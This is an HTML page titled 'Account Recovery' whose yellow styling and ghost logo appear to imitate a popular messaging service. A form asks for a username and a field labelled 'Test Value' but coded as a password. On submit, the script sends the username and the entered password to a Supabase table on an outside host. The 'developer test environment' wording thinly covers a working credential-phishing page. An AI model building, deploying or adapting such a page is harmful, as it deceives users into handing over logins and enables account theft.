<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Account Recovery</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #fffc00;
      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
    }

    .logo {
      width: 78px;
      height: 78px;
      margin: 0 auto 18px;
      background: white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .logo svg {
      width: 50px;
      height: 50px;
    }

    h1 {
      margin: 0 0 8px;
      font-size: 28px;
      color: #111;
    }

    .subtitle {
      margin: 0 0 25px;
      color: #333;
      font-size: 14px;
    }

    .card {
      background: white;
      border-radius: 20px;
      padding: 28px 24px;
      box-shadow: 0 10px 30px rgba(0,0,0,.12);
      text-align: left;
    }

    .field {
      margin-bottom: 18px;
    }

    label {
      display: block;
      margin-bottom: 7px;
      font-size: 13px;
      font-weight: bold;
      color: #111;
    }

    input {
      width: 100%;
      height: 50px;
      padding: 0 15px;
      border: 1px solid #d5d5d5;
      border-radius: 10px;
      font-size: 16px;
      outline: none;
    }

    input:focus {
      border-color: #111;
    }

    button {
      width: 100%;
      height: 52px;
      border: none;
      border-radius: 10px;
      background: #111;
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      opacity: .9;
    }

    button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    #status {
      min-height: 20px;
      margin-top: 15px;
      text-align: center;
      font-size: 13px;
    }

    .success {
      color: #16803c;
    }

    .error {
      color: #c62828;
    }

    .footer {
      margin-top: 18px;
      font-size: 11px;
      color: rgba(0,0,0,.55);
    }
  </style>
</head>

<body>

<div class="container">

  <div class="logo">
    <svg
      viewBox="0 0 64 64"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M32 7
        C19 7 11 17 11 30
        C11 42 17 48 23 51
        C25 52 26 55 26 57
        C28 56 30 55 32 55
        C34 55 36 56 38 57
        C38 55 39 52 41 51
        C47 48 53 42 53 30
        C53 17 45 7 32 7Z"
        fill="#111"
      />

      <circle
        cx="24"
        cy="30"
        r="3"
        fill="#fffc00"
      />

      <circle
        cx="40"
        cy="30"
        r="3"
        fill="#fffc00"
      />

      <path
        d="M24 39C28 42 36 42 40 39"
        stroke="#fffc00"
        stroke-width="3"
        stroke-linecap="round"
      />
    </svg>
  </div>

  <h1>Account Recovery</h1>

  <p class="subtitle">
    Enter your test account information below.
  </p>

  <div class="card">

    <form id="recoveryForm">

      <div class="field">
        <label for="username">Username</label>

        <input
          id="username"
          type="text"
          maxlength="100"
          autocomplete="off"
          required
        >
      </div>

      <div class="field">
        <label for="password">Test Value</label>

        <input
          id="password"
          type="text"
          maxlength="200"
          autocomplete="off"
          required
        >
      </div>

      <button
        id="submitButton"
        type="submit"
      >
        Continue
      </button>

    </form>

    <div id="status"></div>

  </div>

  <div class="footer">
    Developer test environment
  </div>

</div>


<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

  const SUPABASE_URL =
    "https://eylwfjgrauziwzzsewaj.supabase.co";

  const SUPABASE_KEY =
    "sb_publishable_TTCNo4BgRANxkxaE5yqH9A_eDeAbVF8";

  const supabaseClient =
    window.supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );


  const form =
    document.getElementById("recoveryForm");

  const usernameInput =
    document.getElementById("username");

  const passwordInput =
    document.getElementById("password");

  const submitButton =
    document.getElementById("submitButton");

  const status =
    document.getElementById("status");


  form.addEventListener(
    "submit",
    async function(event) {

      event.preventDefault();

      const username =
        usernameInput.value.trim();

      const testValue =
        passwordInput.value;


      if (!username || !testValue) {

        status.textContent =
          "Please complete both fields.";

        status.className = "error";

        return;
      }


      submitButton.disabled = true;

      submitButton.textContent =
        "Saving...";

      status.textContent = "";

      status.className = "";


      const { error } =
        await supabaseClient
          .from("test_submissions")
          .insert({

            username: username,

            password_entered: testValue,

            password_length:
              testValue.length

          });


      if (error) {

        console.error(error);

        status.textContent =
          "Unable to save: " +
          error.message;

        status.className = "error";

        submitButton.disabled = false;

        submitButton.textContent =
          "Continue";

        return;
      }


      status.textContent =
        "Test submission saved successfully.";

      status.className = "success";


      form.reset();

      submitButton.disabled = false;

      submitButton.textContent =
        "Continue";

    });

</script>

</body>
</html>
